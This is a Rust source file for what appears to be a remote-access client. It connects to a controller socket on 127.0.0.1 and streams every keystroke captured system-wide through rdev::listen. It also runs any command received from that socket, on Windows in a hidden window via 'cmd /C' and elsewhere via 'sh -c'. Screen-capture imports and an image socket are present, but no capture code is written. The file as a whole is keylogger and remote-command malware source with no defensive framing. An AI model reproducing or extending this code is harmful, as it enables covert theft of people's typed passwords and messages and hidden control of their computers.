use image::codecs::jpeg::JpegEncoder;
use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use tokio::net::TcpStream;
use tokio::time::Duration;

use scrap::{Capturer, Display};
use image::ExtendedColorType;
use rdev::{Event, listen};

use std::io::ErrorKind::WouldBlock;
use std::thread;
use std::process::Command;

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[tokio::main]
async fn main() -> io::Result<()> {
    let socket_text = TcpStream::connect("127.0.0.1:7878").await?;
    let socket_img = TcpStream::connect("127.0.0.1:7879").await?;
    let (mut rd, mut wr) = io::split(socket_text);
    let (_rd_img, mut wr_img) = io::split(socket_img); 

    let (tx, mut rx) = mpsc::channel(16);

    let tx_clone = tx.clone();
    tokio::task::spawn_blocking( move || {
        let callback = move |event: Event| {
            match event.name {
                Some(string) => {
                    tx_clone.blocking_send(string).expect("cannot send string");
                },
                None => (),
            }
        };

        if let Err(error) = listen(callback) {
            println!("{:?}", error);
        }
    });

    tokio::spawn(async move  {
        while let Some(data) = rx.recv().await {
            wr.write_all(data.as_bytes()).await?;
        }

        Ok::<_, io::Error>(())
    });

    let frame_duration = Duration::from_secs_f32(3.0);



    let mut buf = vec![0; 256];

    loop {
        let n = rd.read(&mut buf).await?;

        if n == 0 {
            break;
        }

        let command = std::str::from_utf8(&buf[..n]);
        
        match command {
            Ok(command) => {
                #[cfg(target_os = "windows")]
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");

                #[cfg(not(target_os = "windows"))]
                Command::new("sh")
                    .args(["-c", command])
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("cannot decode bytes to str")
        }
    }

    Ok(())
}
